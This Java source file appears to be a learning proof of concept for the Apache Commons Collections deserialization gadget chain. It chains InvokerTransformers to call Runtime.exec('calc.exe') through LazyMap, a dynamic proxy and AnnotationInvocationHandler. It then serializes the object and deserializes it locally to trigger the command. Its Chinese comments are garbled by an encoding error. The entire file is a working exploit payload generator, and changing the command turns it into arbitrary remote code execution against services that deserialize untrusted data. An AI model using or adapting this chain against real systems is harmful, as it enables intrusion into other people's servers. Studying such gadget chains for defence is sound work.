package fanxulie;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
//import org.eclipse.persistence.internal.xr.Invocation;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class fanxulie7 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();
        innerMap.put("value","axin");

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        // ����LazyMap��handlerʵ��
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);
        // ����LazyMap�Ķ�̬����ʵ��
        Map mapProxy = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);

        // ����һ��AnnotationInvocationHandlerʵ�������ҰѸոմ����Ĵ���ֵ��this.memberValues
        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);

        // ���л�
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler1);
        oos.flush();
        oos.close();
        // ����ģ�ⷴ���л�
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = (Object) ois.readObject();
    }
}